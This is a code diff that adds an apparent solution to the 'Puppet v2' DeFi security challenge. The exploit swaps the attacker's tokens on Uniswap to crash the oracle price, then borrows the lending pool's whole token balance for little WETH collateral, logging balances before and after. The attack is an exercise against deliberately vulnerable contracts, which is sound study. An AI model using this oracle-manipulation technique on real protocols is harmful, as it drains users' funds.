@@ -82,6 +82,60 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        //*********************************************************************************************************************
+        console.log('\n------- Check Before -----------------------\n');
+        let uniswapDVTBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.token.balanceOf(this.uniswapExchange.address)));
+        let uniswapEthBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.weth.balanceOf(this.uniswapExchange.address)));
+        let poolDVTBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.token.balanceOf(this.lendingPool.address)));
+        let poolETHBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.weth.balanceOf(this.lendingPool.address)));
+        let attackerDVTBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.token.balanceOf(attacker.address)));
+        let attackerETHBalance = ethers.utils.formatEther(ethers.BigNumber.from(await ethers.provider.getBalance(attacker.address)));
+        let attackerWETHBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.weth.balanceOf(attacker.address)));
+
+        console.log("Uniswap DVT Balance: ", uniswapDVTBalance, "DVT");
+        console.log("Uniswap Eth Balacne: ", uniswapEthBalance, "WETH");
+        console.log("Lending Pool DVT Balacne: ", poolDVTBalance, "DVT");
+        console.log("Lending Pool ETH Balacne: ", poolETHBalance, "WETH");
+        console.log("Attacker DVT Balance: ", attackerDVTBalance, "DVT");
+        console.log("Attacker Eth Balacne: ", attackerETHBalance, "ETH");
+        console.log("Attacker WEth Balacne: ", attackerWETHBalance, "WETH");
+
+    //*********************************************************************************************************************
+        
+        console.log('\n------- Exploit ----------------------------\n');
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 0, [this.token.address, this.weth.address], attacker.address, deadline);
+        
+        let calculatedDeposit = await ethers.utils.formatEther(ethers.BigNumber.from(await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)));
+        let calculatedDepositToStringInETH = ethers.utils.parseEther((Math.ceil(calculatedDeposit * 10) / 10).toString());
+        
+        await this.weth.connect(attacker).deposit({value: calculatedDepositToStringInETH } )
+
+        this.weth.connect(attacker).approve(this.lendingPool.address, calculatedDepositToStringInETH);
+        this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+    //*********************************************************************************************************************
+        console.log('\n------- After Exploit ----------------------\n');
+        
+        uniswapDVTBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.token.balanceOf(this.uniswapExchange.address)));
+        uniswapEthBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.weth.balanceOf(this.uniswapExchange.address)));
+        poolDVTBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.token.balanceOf(this.lendingPool.address)));
+        poolETHBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.weth.balanceOf(this.lendingPool.address)));
+        attackerDVTBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.token.balanceOf(attacker.address)));
+        attackerETHBalance = ethers.utils.formatEther(ethers.BigNumber.from(await ethers.provider.getBalance(attacker.address)));
+        attackerWETHBalance = ethers.utils.formatEther(ethers.BigNumber.from(await this.weth.balanceOf(attacker.address)));
+
+        console.log("Uniswap DVT Balance: ", uniswapDVTBalance, "DVT");
+        console.log("Uniswap Eth Balacne: ", uniswapEthBalance, "WETH");
+        console.log("Lending Pool DVT Balacne: ", poolDVTBalance, "DVT");
+        console.log("Lending Pool ETH Balacne: ", poolETHBalance, "WETH");
+        console.log("Attacker DVT Balance: ", attackerDVTBalance, "DVT");
+        console.log("Attacker Eth Balacne: ", attackerETHBalance, "ETH");
+        console.log("Attacker WEth Balacne: ", attackerWETHBalance, "WETH");
+
+
     });
 
     after(async function () {
@@ -91,7 +145,6 @@ describe('[Challenge] Puppet v2', function () {
         expect(
             await this.token.balanceOf(this.lendingPool.address)
         ).to.be.eq('0');
-
         expect(
             await this.token.balanceOf(attacker.address)
         ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
